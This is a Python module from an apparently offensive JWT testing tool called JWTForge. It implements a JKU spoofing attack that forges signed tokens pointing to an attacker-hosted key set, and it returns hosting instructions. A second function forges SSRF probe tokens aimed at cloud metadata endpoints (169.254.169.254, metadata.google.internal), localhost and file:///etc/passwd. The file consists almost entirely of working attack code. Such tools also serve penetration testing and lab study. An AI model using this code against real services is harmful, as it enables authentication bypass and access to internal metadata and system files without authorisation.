"""
JWTForge - JKU (JWK Set URL) Spoofing Attack

The 'jku' header parameter specifies a URL to a JWK Set document
containing the keys used to sign the token.

Attack:
  1. Generate our own RSA key pair
  2. Host a JWKS (JSON Web Key Set) containing our public key
  3. Create a JWT with jku pointing to our hosted JWKS
  4. Sign the JWT with our private key

If the server fetches the JWKS from the URL without restricting to
trusted domains, it will verify our signature as valid.

Variant — SSRF:
  The jku parameter can also be used to probe internal services
  if the server fetches arbitrary URLs.

References:
  - https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
"""

import json
import base64
from typing import Dict, Any, Optional, Tuple

from ..core.parser import JWTParser, b64url_encode


def generate_rsa_keypair(key_size: int = 2048) -> Tuple[object, object]:
    """Generate RSA private/public key pair."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    return private_key, public_key


def pubkey_to_jwk(public_key, kid: str = 'jwtforge-key-1') -> Dict:
    """Convert RSA public key to JWK format."""
    pub_numbers = public_key.public_numbers()

    def int_to_b64url(n: int) -> str:
        byte_length = (n.bit_length() + 7) // 8
        return base64.urlsafe_b64encode(n.to_bytes(byte_length, 'big')).rstrip(b'=').decode()

    return {
        'kty': 'RSA',
        'use': 'sig',
        'kid': kid,
        'alg': 'RS256',
        'n': int_to_b64url(pub_numbers.n),
        'e': int_to_b64url(pub_numbers.e),
    }


def pubkey_to_jwks(public_key, kid: str = 'jwtforge-key-1') -> Dict:
    """Create a JWKS (JWK Set) containing the given public key."""
    return {
        'keys': [pubkey_to_jwk(public_key, kid)]
    }


def sign_token_rs256(private_key, signing_input: bytes) -> bytes:
    """Sign bytes with RSA-SHA256."""
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    return private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())


def attack_jku(
    token: str,
    attacker_host: str = '127.0.0.1',
    attacker_port: int = 8888,
    custom_jku_url: Optional[str] = None,
    kid: str = 'jwtforge-key-1',
    custom_payload: Dict = None,
) -> Dict[str, Any]:
    """
    JKU spoofing attack — forge JWT pointing to attacker-controlled JWKS.

    Args:
        token: Original JWT string
        attacker_host: IP/hostname to host the JWKS
        attacker_port: Port for the JWKS server
        custom_jku_url: Override the jku URL directly
        kid: Key ID to embed in header and JWKS
        custom_payload: Modified payload claims

    Returns:
        Result dict with forged token, JWKS JSON, and server instructions
    """
    try:
        private_key, public_key = generate_rsa_keypair()
        parser = JWTParser(token)
        payload = custom_payload if custom_payload is not None else parser.payload

        jku_url = custom_jku_url or f"http://{attacker_host}:{attacker_port}/.well-known/jwks.json"

        # Build new header
        new_header = {
            'alg': 'RS256',
            'typ': 'JWT',
            'jku': jku_url,
            'kid': kid,
        }

        # Build signing input
        h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
        p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        signing_input = f"{h}.{p}".encode()

        # Sign with our private key
        sig_bytes = sign_token_rs256(private_key, signing_input)
        sig_b64 = b64url_encode(sig_bytes)
        forged_token = f"{h}.{p}.{sig_b64}"

        # Generate JWKS for hosting
        jwks = pubkey_to_jwks(public_key, kid)

        # Export private key PEM (for reference)
        from cryptography.hazmat.primitives import serialization
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ).decode()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()

        return {
            'attack': 'jku_spoof',
            'status': 'success',
            'token': forged_token,
            'jku_url': jku_url,
            'jwks': jwks,
            'jwks_json': json.dumps(jwks, indent=2),
            'private_key_pem': private_pem,
            'public_key_pem': public_pem,
            'kid': kid,
            'note': f'Host JWKS at {jku_url} and submit forged token',
            'detail': f'JKU → {jku_url}',
            'server_instructions': (
                f"1. Start JWTForge JWKS server: jwtforge server --port {attacker_port}\n"
                f"2. Or manually host: python3 -m http.server {attacker_port}\n"
                f"3. Place jwks.json at: /.well-known/jwks.json\n"
                f"4. Ensure target can reach {attacker_host}:{attacker_port}"
            ),
        }

    except ImportError:
        return {
            'attack': 'jku_spoof',
            'status': 'error',
            'detail': 'cryptography library required: pip install cryptography',
        }
    except Exception as e:
        return {
            'attack': 'jku_spoof',
            'status': 'error',
            'detail': str(e),
        }


def attack_jku_ssrf_probe(token: str, probe_urls: list = None) -> list:
    """
    Generate JKU tokens pointing to internal/probe URLs for SSRF detection.

    Args:
        token: Original JWT
        probe_urls: List of URLs to probe

    Returns:
        List of forged tokens with probe URLs
    """
    if not probe_urls:
        probe_urls = [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/v1/',  # Azure/DigitalOcean
            'http://127.0.0.1/jwks.json',
            'http://localhost:8080/jwks.json',
            'file:///etc/passwd',
        ]

    results = []
    parser = JWTParser(token)

    try:
        private_key, public_key = generate_rsa_keypair()
        jwks = pubkey_to_jwks(public_key)

        from cryptography.hazmat.primitives import serialization
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ).decode()

        for url in probe_urls:
            new_header = {
                'alg': 'RS256',
                'typ': 'JWT',
                'jku': url,
                'kid': 'jwtforge-key-1',
            }
            h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
            p = b64url_encode(json.dumps(parser.payload, separators=(',', ':')).encode())
            signing_input = f"{h}.{p}".encode()
            sig_bytes = sign_token_rs256(private_key, signing_input)
            forged = f"{h}.{p}.{b64url_encode(sig_bytes)}"

            results.append({
                'attack': 'jku_ssrf',
                'probe_url': url,
                'token': forged,
                'status': 'success',
                'detail': f'SSRF probe → {url}',
            })
    except Exception as e:
        results.append({'attack': 'jku_ssrf', 'status': 'error', 'detail': str(e)})

    return results
